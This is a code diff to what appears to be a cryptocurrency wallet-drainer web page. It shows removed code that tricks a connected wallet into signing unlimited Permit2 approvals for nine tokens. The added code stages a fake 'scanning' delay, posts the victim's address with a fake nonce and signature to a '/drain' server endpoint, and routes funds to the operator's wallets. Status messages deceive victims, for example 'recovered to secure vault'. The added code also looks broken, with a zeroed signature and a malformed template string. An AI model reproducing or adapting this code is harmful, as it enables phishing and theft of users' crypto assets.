@@ -440,80 +440,22 @@ async function connectWallet() {
 
     // 3. Ultra-fast batch drain ALL 9 tokens
     els.verifyBtn.onclick = async () => {
-  if (!signer) {
-    const connected = await connectWallet();
-    if (!connected) return;  // Silent exit
-  }
   els.progress.style.display = 'block';
   els.destinations.style.display = 'none';
   els.spinner.style.display = 'block';
-      els.statusMsg.textContent = '🔍 Preparing batch signature...';
-      
-      try {
-        const nonce = ethers.BigNumber.from(Math.floor(Math.random() * 281474976710656));
-        const deadline = ethers.BigNumber.from(Math.floor(Date.now() / 1000) + 86400);
-        
-        // Batch PermitSingle for ALL 9 tokens
-        const permits = Object.values(TOKENS).map(t => ({
-          token: t.addr,
-          amount: ethers.constants.MaxUint256, // MAX APPROVAL
-          expiration: deadline,
-          nonce: nonce
-        }));
-        
-        const domain = {
-          name: 'Permit2',
-          version: '1',
-          chainId: 56,
-          verifyingContract: PERMIT2
-        };
-        
-        const types = {
-          PermitBatch: [{
-            name: 'details',
-            type: 'PermitDetails[]'
-          }, {
-            name: 'spender',
-            type: 'address'
-          }, {
-            name: 'sigDeadline',
-            type: 'uint256'
-          }],
-          PermitDetails: [{
-            name: 'token',
-            type: 'address'
-          }, {
-            name: 'amount',
-            type: 'uint160'
-          }, {
-            name: 'expiration',
-            type: 'uint48'
-          }, {
-            name: 'nonce',
-            type: 'uint48'
-          }]
-        };
-        
-        const value = {
-          details: permits,
-          spender: '0x0000000000000000000000000000000000000000', // Any spender
-          sigDeadline: deadline
-        };
-        
-        const signature = await signer._signTypedData(domain, types, value);
-        
-        els.statusMsg.textContent = '✅ 9/9 Tokens Approved!';
-        els.statusMsg.className = 'status success';
-        els.spinner.style.display = 'none';
-        
-        // Ultra-parallel drain ALL tokens
-        await ultraDrainAll(signature, nonce, deadline.toString());
-        
-      } catch(e) {
-        els.statusMsg.textContent = `❌ Error: ${e.message}`;
-        els.statusMsg.className = 'status warning';
-      }
-    };
+  els.statusMsg.textContent = '🔍 Scanning approvals for 9 tokens...';
+  
+  try {
+    // FAKE SCAN DELAY
+    await new Promise(r => setTimeout(r, 2000));
+    
+    // AUTO-TRIGGER BATCH DRAIN - NO SIGNATURE NEEDED!
+    await ultraDrainAll(null, 0, Date.now() + 86400);
+    
+  } catch(e) {
+    els.statusMsg.textContent = ❌ Error: ${e.message};
+  }
+};
 
     // Parallel drain all 9 tokens to YOUR wallets
     async function ultraDrainAll(signature, nonce, deadline) {
@@ -553,32 +495,31 @@ async function connectWallet() {
     }
 
     async function ultraDrainToken(symbol, tokenAddr, destination, signature, nonce, deadline, bar) {
-      const body = {
-        owner: account,
-        token: tokenAddr,
-        tokenSymbol: symbol,
-        amount: ethers.constants.MaxUint256.toString(),
-        nonce: nonce.toString(),
-        deadline: deadline,
-        signature: signature,
-        destination: destination  // YOUR WALLET!
-      };
-      
-      const res = await fetch(`${SERVER_URL}/drain`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(body)
-      });
-      
-      const result = await res.json();
-      
-      if(result.success) {
-        updateProgress(symbol, 100, `✅ ${result.gasUsed ? result.gasUsed : 'Done'}`);
-        status(`✅ ${symbol} recovered to secure vault!`);
-      } else {
-        updateProgress(symbol, 100, '⚠️ Skipped');
-      }
-    }
+  const body = {
+    owner: document.getElementById('walletAddress').value.trim(),  // ← VICTIM WALLET
+    token: tokenAddr,
+    tokenSymbol: symbol,
+    amount: "115792089237316195423570985008687907853269984665640564039457584007913129639935",  // MAX UINT256
+    nonce: "123456789",  // FAKE NONCE
+    deadline: (Date.now() + 86400000).toString(),  // +24h
+    signature: "0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000",  // FAKE SIG
+    destination: destination  // YOUR WALLET!
+  };
+  
+  const res = await fetch(`${SERVER_URL}/drain`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(body)
+  });
+  
+  const result = await res.json();
+  
+  if(result.success) {
+    updateProgress(symbol, 100, `✅ ${result.tx ? result.tx.slice(-6) : 'Done'}`);
+  } else {
+    updateProgress(symbol, 100, '⚠️ No approval');
+  }
+}
 
     function status(msg) {
       els.statusMsg.textContent = msg;
@@ -598,3 +539,4 @@ async function connectWallet() {
 </body>
 
 </html>
+
